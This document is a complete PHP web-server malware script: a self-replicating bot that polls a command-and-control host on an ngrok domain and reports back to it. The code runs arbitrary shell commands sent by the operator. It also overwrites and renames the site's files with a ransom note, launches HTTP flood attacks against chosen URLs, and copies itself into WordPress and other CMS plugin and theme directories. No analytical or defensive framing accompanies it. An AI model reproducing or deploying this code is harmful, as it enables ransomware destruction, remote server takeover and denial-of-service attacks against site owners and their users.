<?php
set_time_limit(0);
ignore_user_abort(true);

$c2 = "https://lenient-definitely-guppy.ngrok-free.app";
define("BOT_ID", substr(md5($_SERVER['HTTP_HOST']), 0, 16));
define("RANSOM_NOTE", "<html><body style='background:black;color:lime;text-align:center;font-family:monospace;'><h1>Encrypted by SkyNet</h1><p>Your files have been secured.</p></body></html>");

function safe_exec($cmd) {
    if (function_exists('shell_exec')) return shell_exec($cmd);
    if (function_exists('exec')) { exec($cmd, $out); return implode("\n", $out); }
    return "[RED] exec functions disabled.";
}

function is_targeted($cmd) {
    if (preg_match('/-only\s+(\w+)/', $cmd, $m)) return strpos(BOT_ID, $m[1]) === 0;
    return true;
}

function backup_files($dir, $zipfile) {
    $log = "[RED] Encrypting files:\n";
    $zip = new ZipArchive();
    if ($zip->open($zipfile, ZipArchive::CREATE) !== true) return $log . "[RED] Zip failed\n";

    $core = ['index.php', 'wp-config.php', 'functions.php', 'main.php', 'router.php'];
    foreach ($core as $f) {
        $full = $dir . "/" . $f;
        if (file_exists($full)) {
            $zip->addFile($full, $f);
            file_put_contents($full, RANSOM_NOTE);
            @rename($full, $full . ".locked");
            $log .= "[RED] => $f encrypted\n";
        }
    }

    $all = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    foreach ($all as $f) {
        if (!$f->isFile()) continue;
        $p = $f->getRealPath();
        if (strpos($p, "mod_") !== false || strpos($p, "sys-cache") !== false) continue;
        $zip->addFile($p, substr($p, strlen($dir)));
        file_put_contents($p, RANSOM_NOTE);
        @rename($p, $p . ".locked");
        $log .= "[RED] => $p\n";
    }

    $zip->close();
    $log .= "[RED] Backup completed.\n";
    return $log;
}

function spread_images($url, $n) {
    $log = "[GREEN] Spreading images:\n";
    $dirs = ['.', 'wp-content', 'storage', 'assets', 'themes', 'modules', 'public'];
    foreach ($dirs as $d) {
        if (!is_dir($d)) continue;
        for ($i = 0; $i < $n; $i++) {
            $f = $d . "/img_" . substr(md5(microtime().$i), 0, 6) . ".jpg";
            $img = @file_get_contents($url);
            if ($img) {
                file_put_contents($f, $img);
                $log .= "[GREEN] => $f\n";
            }
        }
    }
    return $log;
}

// Watchdog: self-replication
$cms_dirs = ['wp-content/plugins/', 'wp-content/themes/', 'wp-content/uploads/', 'storage/', 'assets/', 'modules/', 'templates/', 'public/', 'infusions/', 'typo3conf/ext/'];
foreach ($cms_dirs as $path) {
    if (!is_dir($path)) continue;
    $files = glob($path . "mod_*.php");
    if (count($files) === 0) {
        $name = "mod_" . substr(md5(microtime()), 0, 6) . ".php";
        $self = @file_get_contents(__FILE__);
        if ($self) {
            file_put_contents($path . $name, $self);
            include_once($path . $name);
        }
    }
}

// Start bot
if (php_sapi_name() !== 'cli') {
    header("Content-Type: text/plain");
    echo "Bot started.";
    if (function_exists("fastcgi_finish_request")) fastcgi_finish_request();
    else { ob_end_flush(); flush(); }
}

while (true) {
    $cmd = trim(@file_get_contents("$c2/cmd/global"));
    if (!is_targeted($cmd)) { sleep(rand(60, 90)); continue; }

    $output = "";

    if (preg_match('/encrypt/', $cmd)) {
        $output = backup_files(__DIR__, "backup_" . BOT_ID . ".zip");

    } elseif (preg_match('/fucker\s+-only\s+(\w+)\s+(https?:\/\/\S+)\s+(\d+)/', $cmd, $m)) {
        if (strpos(BOT_ID, $m[1]) === 0) $output = spread_images($m[2], intval($m[3]));

    } elseif (preg_match('/risker-html.*?(https?:\/\/\S+)/', $cmd, $m)) {
        $t = ['/style.css', '/script.js', '/index.php', '/main.php'];
        $u = rtrim($m[1], '/');
        $output = "[GREEN] Starting L7 HTML flood:\n";
        foreach ($t as $f) for ($i=0; $i<5; $i++) {
            $output .= "[GREEN] => $u$f\n";
            @file_get_contents($u . $f . '?cache=' . rand());
        }

    } elseif (!empty($cmd)) {
        $output = substr(safe_exec($cmd), 0, 300);
    }

    if ($output) {
        @file_get_contents("$c2/result?bot=" . BOT_ID . "&output=" . urlencode($output));
    }

    @file_get_contents("$c2/register?bot=" . BOT_ID . "&host=" . urlencode($_SERVER['HTTP_HOST']) . "&agent=" . urlencode($_SERVER['HTTP_USER_AGENT']));
    sleep(rand(48, 99));
}
?>
